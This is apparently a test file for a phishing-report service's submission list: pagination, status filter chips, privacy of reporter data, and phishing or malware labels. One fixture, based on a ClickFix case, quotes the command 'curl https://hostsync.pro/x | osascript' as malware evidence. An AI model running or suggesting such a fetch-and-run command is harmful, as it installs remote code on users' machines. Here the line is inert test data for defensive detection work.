import { describe, expect, test } from "bun:test";

import { SubmissionsEntity } from "@/lib/db/entities/submissions";
import { useTemporaryDatabase } from "@/lib/db/test_helpers";
import { GET } from "@/app/api/submissions/route";
import { NextRequest } from "next/server";
import { parseSubmissionFilters, SubmissionFilterError, submissionFilterOf, SUBMISSION_FILTERS } from "./filters";
import { submissionStatus } from "@/lib/db/schema";
import { listSubmissionCards, SubmissionCursorError } from "./list";

useTemporaryDatabase();

async function create(id: bigint, createdAt: Date, data: Parameters<typeof SubmissionsEntity.create>[0]["data"], status: Parameters<typeof SubmissionsEntity.create>[0]["status"] = "reported") {
	await SubmissionsEntity.create({ id, kind: data.kind, data, dedupeKey: `list-${id}`, status, source: "test" });
	await SubmissionsEntity.update(id, { createdAt });
}

describe("submission list pages", () => {
	test("returns only card fields, newest first, with a title for every kind", async () => {
		await create(1n, new Date("2026-10-01T00:00:00Z"), { kind: "website", website: { url: "https://kit.example.com/login", whois: { ip_rdaps: [] } } });
		await create(2n, new Date("2026-10-02T00:00:00Z"), { kind: "email", email: { subject: "Your account is locked" } as never });
		await create(3n, new Date("2026-10-03T00:00:00Z"), { kind: "email", email: { subject: "" } as never });
		await SubmissionsEntity.update(1n, { reporterIp: "203.0.113.9", reporterHeaders: { "user-agent": "secret" } });

		const page = await listSubmissionCards();
		expect(page).toEqual({
			submissions: [
				{ id: "3", kind: "email", status: "reported", createdAt: "2026-10-03T00:00:00.000Z", title: "list-3", reportedAs: "phishing" },
				{ id: "2", kind: "email", status: "reported", createdAt: "2026-10-02T00:00:00.000Z", title: "Your account is locked", reportedAs: "phishing" },
				// A website reported before its verdicts were kept says only that it was reported.
				{ id: "1", kind: "website", status: "reported", createdAt: "2026-10-01T00:00:00.000Z", title: "https://kit.example.com/login" },
			],
			counts: { running: 0, reported: 3, no_threat: 0, failed: 0 },
		});
		// The reporter's IP and headers, and the full analysis data, are not part of the public list.
		expect(JSON.stringify(page)).not.toContain("203.0.113.9");
		expect(JSON.stringify(page)).not.toContain("whois");
	});

	test("a reported case says what it was reported for, across every route: phishing, malware, both, or only the deceptive funnel its chain is", async () => {
		const funnel = { verdict: { finding: "deceptive_funnel" }, extraction: {} } as never;
		const hop = { hopIndex: 0, judgedHopIndex: 0 };
		const phishing = { ...hop, finding: "phishing" as const, phishingBasis: "credential_theft" as const, evidenceQuote: "Sign in" };
		const malware = { ...hop, finding: "malware" as const, evidenceQuote: "curl https://hostsync.pro/x | osascript" };
		await create(11n, new Date("2026-10-01T00:00:00Z"), { kind: "website", website: { url: "https://lure.com/", routes: [{ hops: [], funnel, siteAssessments: [{ ...hop, finding: "insufficient_evidence" }] }] } });
		await create(12n, new Date("2026-10-02T00:00:00Z"), { kind: "website", website: { url: "https://kit.com/", routes: [{ hops: [], funnel, siteAssessments: [phishing] }] } });
		await create(13n, new Date("2026-10-03T00:00:00Z"), { kind: "website", website: { url: "https://shop.com/", routes: [{ hops: [], funnel: { verdict: { finding: "not_deceptive" }, extraction: {} } as never }] } }, "invalid");
		// Production case 384401854580134038: a ClickFix clone is malware, not phishing.
		await create(14n, new Date("2026-10-04T00:00:00Z"), { kind: "website", website: { url: "https://trylevo.app/", routes: [{ hops: [], siteAssessments: [{ ...hop, finding: "benign" }] }, { hops: [], siteAssessments: [malware] }] } });
		await create(15n, new Date("2026-10-05T00:00:00Z"), { kind: "website", website: { url: "https://mixed.com/", routes: [{ hops: [], siteAssessments: [phishing] }, { hops: [], siteAssessments: [malware] }] } });
		// A malware verdict of a case that is not reported (yet) labels nothing.
		await create(16n, new Date("2026-10-06T00:00:00Z"), { kind: "website", website: { url: "https://running.com/", routes: [{ hops: [], siteAssessments: [malware] }] } }, "running");
		const page = await listSubmissionCards();
		expect(page.submissions.map(({ id, reportedAs }) => ({ id, reportedAs }))).toEqual([
			{ id: "16", reportedAs: undefined },
			{ id: "15", reportedAs: "phishing_and_malware" },
			{ id: "14", reportedAs: "malware" },
			{ id: "13", reportedAs: undefined },
			{ id: "12", reportedAs: "phishing" },
			{ id: "11", reportedAs: "deceptive_funnel" },
		]);
	});

	test("pages through every submission exactly once, across equal timestamps and new arrivals", async () => {
		const base = Date.parse("2026-10-10T00:00:00Z");
		// 7 submissions; ids 13-15 share one timestamp so the id breaks the tie.
		const times = [base, base + 1, base + 2, base + 3, base + 3, base + 3, base + 4];
		for (const [index, time] of times.entries()) {
			await create(BigInt(10 + index), new Date(time), { kind: "website", website: { url: `https://site-${index}.example.com/` } });
		}

		const first = await listSubmissionCards({ limit: 3 });
		expect(first.submissions.map(({ id }) => id)).toEqual(["16", "15", "14"]);
		expect(first.nextCursor).toBe(`${base + 3}.14`);

		// A submission arriving between page loads does not shift the older pages.
		await create(99n, new Date(base + 10), { kind: "website", website: { url: "https://new.example.com/" } });

		const second = await listSubmissionCards({ cursor: first.nextCursor, limit: 3 });
		expect(second.submissions.map(({ id }) => id)).toEqual(["13", "12", "11"]);
		const third = await listSubmissionCards({ cursor: second.nextCursor, limit: 3 });
		expect(third.submissions.map(({ id }) => id)).toEqual(["10"]);
		expect(third.nextCursor).toBeUndefined();

		const seen = [...first.submissions, ...second.submissions, ...third.submissions].map(({ id }) => id);
		expect(new Set(seen).size).toBe(7);
	});

	test("every status belongs to exactly one chip", () => {
		for (const status of submissionStatus) {
			expect(Object.values(SUBMISSION_FILTERS).filter((statuses) => (statuses as readonly string[]).includes(status))).toHaveLength(1);
			expect((SUBMISSION_FILTERS[submissionFilterOf(status)] as readonly string[])).toContain(status);
		}
	});

	test("filters by status chip across pages, and counts every submission under its chip", async () => {
		const base = Date.parse("2026-10-30T00:00:00Z");
		const statuses = ["running", "reported", "invalid", "invalid", "failed", "failed", "reported", "invalid"] as const;
		for (const [index, status] of statuses.entries()) {
			await create(BigInt(300 + index), new Date(base + index), { kind: "website", website: { url: `https://s${index}.example.com/` } }, status);
		}
		const counts = { running: 1, reported: 2, no_threat: 3, failed: 2 };

		// The default chips: what is being analyzed now and what was confirmed, newest first.
		const first = await listSubmissionCards({ filters: ["running", "reported"], limit: 2 });
		expect(first.submissions.map(({ id, status }) => `${id}:${status}`)).toEqual(["306:reported", "301:reported"]);
		expect(first.counts).toEqual(counts);
		const second = await listSubmissionCards({ filters: ["running", "reported"], limit: 2, cursor: first.nextCursor });
		expect(second.submissions.map(({ id }) => id)).toEqual(["300"]);
		expect(second.nextCursor).toBeUndefined();
		// Older pages carry no counts; the newest page's refresh keeps them current.
		expect(second.counts).toBeUndefined();

		expect((await listSubmissionCards({ filters: ["failed"] })).submissions.map(({ id }) => id)).toEqual(["305", "304"]);
		expect((await listSubmissionCards({ filters: ["failed", "no_threat"] })).submissions.map(({ id }) => id)).toEqual(["307", "305", "304", "303", "302"]);
		// No chip lists nothing, but still counts everything.
		expect(await listSubmissionCards({ filters: [] })).toEqual({ submissions: [], counts });
		// Without a filter, everything is listed.
		expect((await listSubmissionCards()).submissions).toHaveLength(statuses.length);
	});

	test("the API takes chips as ?status= and refuses unknown ones", async () => {
		await create(400n, new Date("2026-11-01T00:00:00Z"), { kind: "website", website: { url: "https://a.example.com/" } }, "invalid");
		await create(401n, new Date("2026-11-01T00:00:01Z"), { kind: "website", website: { url: "https://b.example.com/" } }, "running");
		const get = (query: string) => GET(new NextRequest(`https://phishing.support/api/submissions${query}`));

		expect((await (await get("?status=running,reported")).json()).submissions.map(({ id }: { id: string }) => id)).toEqual(["401"]);
		expect((await (await get("?status=")).json()).submissions).toEqual([]);
		expect((await (await get("")).json()).submissions).toHaveLength(2);
		// The chips are named for what a case was found to be, which covers malware: "phishing" is no chip.
		const refused = await get("?status=running,phishing");
		expect(refused.status).toBe(400);
		expect((await refused.json()).error).toBe('Unknown submission filter "phishing"; use running, reported, no_threat, failed.');

		expect(parseSubmissionFilters(" running , running,failed,")).toEqual(["running", "failed"]);
		expect(() => parseSubmissionFilters("__proto__")).toThrow(SubmissionFilterError);
	});

	test("bounds the page size and rejects a malformed cursor", async () => {
		for (let index = 0; index < 3; index++) {
			await create(BigInt(200 + index), new Date(Date.parse("2026-10-20T00:00:00Z") + index), { kind: "website", website: { url: `https://p${index}.example.com/` } });
		}
		expect((await listSubmissionCards({ limit: 0 })).submissions).toHaveLength(1);
		expect((await listSubmissionCards({ limit: 1_000 })).submissions).toHaveLength(3);
		for (const cursor of ["abc", "1.2.3", "-1.5", `${"9".repeat(16)}.1`]) {
			await expect(listSubmissionCards({ cursor })).rejects.toBeInstanceOf(SubmissionCursorError);
		}
	});
});
